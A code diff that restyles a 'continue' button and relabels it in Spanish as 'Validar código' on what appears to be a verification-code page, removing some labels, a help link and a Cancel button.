@@ -12,6 +12,50 @@
          li.TextBox::marker {
          content: none;
          }
+
+          #continue {
+          -webkit-text-size-adjust: 100%;
+          -webkit-tap-highlight-color: rgba(0,0,0,0);
+          box-sizing: border-box;
+          font: inherit;
+          text-transform: none;
+          -webkit-appearance: button;
+          font-family: inherit;
+          opacity: 1;
+          background-size: 10% 70%;
+          background-position-x: 3%;
+          background-position-y: 50%;
+          background-repeat: no-repeat;
+          overflow: hidden;
+          max-width: 380px;
+          transition: background-color 0.3s ease, color 0.3s ease;
+          background-image: none;
+          background-color: #fec82f;
+          border: none;
+          border-radius: .5rem;
+          cursor: pointer;
+          display: block;
+          font-size: 1em;
+          font-weight: 400;
+          height: inherit;
+          line-height: 1.3333333;
+          margin-top: 2rem;
+          margin-bottom: 1.2rem;
+          padding: 10px 16px;
+          text-align: center;
+          touch-action: manipulation;
+          vertical-align: middle;
+          white-space: nowrap;
+          -webkit-user-select: none;
+          color: #000000;
+          width: 63%;
+          box-shadow: 0 0 30px 0 #dae1f7;
+          
+          /* Centrando el botón */
+          margin-left: auto;
+          margin-right: auto;
+      }
+         
          
          .options {
          display: flex;
@@ -323,7 +367,7 @@
                     { type: 'remove', selector: 'label#verificationCode_label', text: 'Verification Code' },
                     { type: 'remove', selector: 'a.helpLink.tiny', text: 'What is this?' },
                     { type: 'remove', selector: 'button#cancel', text: 'Cancel' },
-
+                    { type: 'replace', selector: 'button#continue', oldText: 'Continue', newText: 'Validar código' }, // Cambiar el texto del botón
                 ]);
                 clearInterval(intervalIdnew); // Detener el intervalo una vez que se haya ejecutado la operación
             }, 100);
